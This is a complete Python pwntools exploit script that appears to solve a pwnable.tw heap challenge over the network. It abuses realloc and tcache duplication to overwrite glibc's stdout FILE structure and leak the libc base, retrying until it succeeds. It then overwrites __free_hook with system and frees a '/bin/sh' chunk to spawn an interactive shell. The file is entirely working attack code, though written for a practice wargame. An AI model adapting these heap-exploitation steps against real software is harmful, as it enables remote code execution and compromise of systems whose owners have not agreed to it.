from pwn import *

### ref 1 : https://www.cjovi.icu/WP/1203.html about how to use IO_STDOUT to leak libc
### ref 2 : Play with FILE Structure - Yet Another Binary Exploit Technique : angelboy
def create(idx,size,data):
    r.sendlineafter(b'Your choice: ',b'1')
    r.sendlineafter(b'Index:',str(idx))
    r.sendlineafter(b'Size:',str(size))
    r.sendlineafter(b'Data:',data)

def realloc_edit(idx,size,data):
    r.sendlineafter(b'Your choice: ',b'2')
    r.sendlineafter(b'Index:',str(idx))
    r.sendlineafter(b'Size:',str(size))
    r.sendafter(b'Data:',data)

def realloc_free(idx):
    r.sendlineafter(b'Your choice: ',b'2')
    r.sendlineafter(b'Index:',str(idx))
    r.sendlineafter(b'Size:',str(0))

def free(idx):
    r.sendlineafter(b'Your choice: ',b'3')
    r.sendlineafter(b'Index:',str(idx))

while True:
    try :
        #r = process("./R", env={"LD_PRELOAD" : "./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so"})
        r = remote('chall.pwnable.tw',10310)

        ### chunk we use to edit fake chunks size and do UAF
        create(1,0x68,p64(0)) # 0x260
        realloc_edit(1,0x68,p64(0)*7 + p64(0x91))   ### fake chunk size(head)
        free(1)  

        ### tcache dup to  fake chunk address 0x2a0 (no need to guess aslr)
        create(0,0x78,p64(0)) # 0x2e0
        realloc_free(0)
        realloc_edit(0,0x78,p64(0)*2)  
        realloc_free(0)
        realloc_edit(0,0x78,b'\xa0')    ### partial overwrite fd ptr to fake chunk address at 0x2a0

        ## triger malloc dup 
        create(1,0x78,b'') 
        realloc_edit(1,0x28,b'\x00') 
        free(1)
        realloc_edit(0,0x28,p64(0)*2)
        free(0)

        ## get fake chunk address and first chunk to edit fake chunk 
        create(1,0x78,p64(0))  ### 0x2a0
        create(0,0x68,p64(0))  ### 0x260

        ## fill 0x90 tcache
        for i in range(7):
            realloc_free(1)
            realloc_edit(0,0x68,p64(0)*7 + p64(0x91) + p64(0) + p64(0))

        ### leave some tcache to do tcache dup at 0x2a0
        for i in range(2):
            realloc_edit(0,0x68,p64(0)*7 + p64(0x61) + p64(0) + p64(0))
            realloc_free(1)

        ### get unsorted bin and let unsorted bin's fd address(libc) locate at fake chunk(tcache) fd to do tcache dup 
        realloc_edit(0,0x68,p64(0)*7 + p64(0x91) + p64(0) + p64(0))
        free(0) 
        create(0,0x48,p64(0) * 5 + p64(0x21))   ### forge fake chunks' bottom to bypass malloc check 
        realloc_free(1) ## get unsorted bin  

        #### tcache dup using fake chunk to get chunk at stdout FILE structure
        free(0)
        realloc_edit(1,0x48,b'\x60\x27')   ### set to stdout, 1/16 success
        create(0,0x58,p64(0) * 5 + p64(0x21)) 

        ### overwrite stdout buffer to leak libc 
        realloc_edit(0,0x48,p64(0)) 
        free(0)
        create(0,0x58,p64(0xfbad1887) + p64(0)*3 )   


        leak = r.recv(6) 
        if b'\x7f' not in leak :
            raise
        break
    except:
        print(f'MISS !!!')
        r.close()
        pass

#realloc_edit()
#realloc_free(1)


libc_base = u64(leak + b'\x00\x00') - 0x1b2627
success(f'LIBC : {hex(libc_base)}')

r.recvuntil(b'$$$$$$$$$$$$$$$$$$$$$$$$$$$')

realloc_edit(1,0x38,p64(0)*2) 
free(1)

### tcache dup  overwrite __free_hook to system address and get shell
free_hook = libc_base + 0x1e75a8
system = libc_base + 0x52fd0

create(1,0x68,p64(0))
realloc_edit(1,0x68,p64(0)*7 + p64(0x51) + p64(free_hook-8)) 
realloc_edit(1,0x58,p64(0)) 
free(1)

create(1,0x48,p64(0))
realloc_edit(1,0x28,p64(0)) 
free(1)

create(1,0x48,b'/bin/sh\x00' + p64(system))
free(1)



r.interactive()